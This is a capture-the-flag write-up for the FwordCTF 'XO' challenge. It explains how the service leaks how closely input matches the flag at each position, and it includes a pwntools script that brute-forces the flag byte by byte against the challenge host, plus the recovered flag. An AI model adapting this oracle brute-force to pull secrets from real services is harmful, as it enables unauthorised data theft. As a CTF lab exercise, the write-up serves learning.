# XO

Whatever we input, the binary searches for characters in our input that are the same as a character of the flag in the same position. It prints the number of characters before the first occurrence of this. For example, if the flag was FwordCTF{}, then...

Fgjehrfd -> 0
sws -> 1
gggg -> 4

Using this, we can run a simple byte by byte bruteforce in order to get the data in flag.txt -  NuL1_Byt35?15_IT_the_END?Why_i_c4nT_h4ndl3_That!}

Adding the flag format, we get the flag, FwordCTF{NuL1_Byt35?15_IT_the_END?Why_i_c4nT_h4ndl3_That!}

I used backticks for padding since they were pretty much guaranteed not to be in the flag - we can send backtick_padding + char and bruteforce "char" until the number returned equals the number of backticks, the character of the flag in that position would be the char where the server returned number is equal to the number of backticks.

#### Flag: FwordCTF{NuL1_Byt35?15_IT_the_END?Why_i_c4nT_h4ndl3_That!}
```py
from pwn import *
import time
printable = "?_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*(){},./<~\\"
host = ('xo.fword.wtf', 5554)
def getnum(string):
    while True:
        try:
            p = remote(*host)
            break
        except socket.gaierror:
            time.sleep(1)
    #p = process("./task")
    p.recvline()
    p.sendline(string)
    ans = int(p.recvline())
    p.close()
    return ans
flag = ''
i = len(flag)
while '}' not in flag:
    pad = '`'*i 
    for char in printable:
        totry = pad + char
        print(totry)
        if getnum(totry) == i:
            flag += char
            print(f"Flag: {flag}")
            break
    else:
        print(flag)
        quit()
    i += 1
    ```
